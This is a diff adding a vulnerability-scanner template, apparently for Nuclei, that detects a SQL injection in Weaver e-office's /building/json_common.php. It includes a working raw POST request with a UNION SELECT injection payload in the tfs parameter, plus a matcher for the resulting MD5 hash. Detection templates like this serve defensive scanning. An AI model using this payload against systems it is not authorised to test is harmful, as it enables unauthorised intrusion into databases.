@@ -1,0 +1,39 @@
+id: weaver-eoffice-sql-injection
+info:
+  name: Weaver e-office json_common.php tfs SQL injection vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver E-office is an OA product launched by Weaver for small and medium-sized organizations. There is a SQL injection vulnerability in Weaver E-office when sending tfs parameters to /building/json_common.php via POST.
+  reference:
+    - https://service.e-office.cn/download
+  classification:
+    cvss-score: 7.8
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /building/json_common.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Referer: http://www.baidu.com
+        Cache-Control: max-age=0
+        Connection: keep-alive
+        Content-Length: 67
+
+        tfs=city%60+where+cityId+%3d-1+/*!50000union*/+/*!50000select*/+1,2,MD5(23432)+,4%23|2|333
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1cdbc566ab18141dbf2586d9707cdfdc"
+        part: body
